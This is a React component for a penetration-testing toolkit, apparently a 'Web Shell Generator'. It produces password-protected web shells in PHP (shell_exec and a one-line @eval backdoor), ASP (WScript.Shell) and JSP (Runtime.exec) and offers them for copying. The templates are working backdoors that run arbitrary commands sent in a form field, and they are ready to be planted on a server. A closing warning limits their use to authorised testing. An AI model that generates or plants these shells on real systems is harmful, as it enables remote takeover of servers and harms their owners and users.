import { useState } from 'react';
import ToolWrapper from './ToolWrapper';
import { WebIcon } from '../common/Icons';
import styles from './SharedTool.module.css';

type ShellType = 'php-simple' | 'php-mini' | 'asp' | 'jsp';

export default function WebShellGenerator() {
  const [shellType, setShellType] = useState<ShellType>('php-simple');
  const [password, setPassword] = useState('');
  const [output, setOutput] = useState('');
  const [error, setError] = useState('');

  const templates: Record<ShellType, (pwd: string) => string> = {
    'php-simple': (pwd) => `<?php
if (isset($_POST['cmd'])) {
    if ($_POST['pwd'] === '${pwd}') {
        echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
    } else {
        die("Access denied");
    }
}
?>
<form method="POST">
    <input type="password" name="pwd" placeholder="Password">
    <input type="text" name="cmd" placeholder="Command">
    <input type="submit" value="Execute">
</form>`,
    'php-mini': (pwd) => `<?php @eval(isset($_POST['${pwd}']) ? $_POST['${pwd}'] : die()); ?>`,
    asp: (pwd) => `<%
If Request.Form("pwd") = "${pwd}" Then
    Set WshShell = Server.CreateObject("WScript.Shell")
    Response.Write("<pre>" & WshShell.Exec("cmd /c " & Request.Form("cmd")).StdOut.ReadAll() & "</pre>")
End If
%>`,
    jsp: (pwd) => `<%@ page import="java.io.*" %>
<%
if (request.getParameter("pwd") != null && request.getParameter("pwd").equals("${pwd}")) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
}
%>`,
  };

  const generate = () => {
    if (!password.trim()) {
      setError('Please enter a password');
      return;
    }
    setOutput(templates[shellType](password));
  };

  return (
    <ToolWrapper
      title="Web Shell Generator"
      icon={<WebIcon />}
      description="Generate password-protected web shells"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Shell Type</label>
          <select
            className={styles.select}
            value={shellType}
            onChange={(e) => setShellType(e.target.value as ShellType)}
          >
            <option value="php-simple">PHP - Simple</option>
            <option value="php-mini">PHP - Mini</option>
            <option value="asp">ASP Classic</option>
            <option value="jsp">JSP Basic</option>
          </select>
        </div>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Password</label>
          <input
            type="password"
            className={styles.input}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Enter shell password"
          />
        </div>
        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={generate}>
            Generate Shell
          </button>
          <button
            className={styles.secondaryBtn}
            onClick={() => {
              setPassword('');
              setOutput('');
              setError('');
            }}
          >
            Clear
          </button>
        </div>
      </div>

      {error && <div className={styles.errorBox}>{error}</div>}

      {output && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Generated Shell</span>
            <button
              className={styles.copyBtn}
              onClick={() => navigator.clipboard.writeText(output)}
            >
              Copy
            </button>
          </div>
          <pre className={styles.codeBlock}>{output}</pre>
        </div>
      )}

      <div className={styles.warningBox}>
        CRITICAL: Only deploy on systems you own or have explicit authorization to test.
        Unauthorized access is illegal.
      </div>
    </ToolWrapper>
  );
}
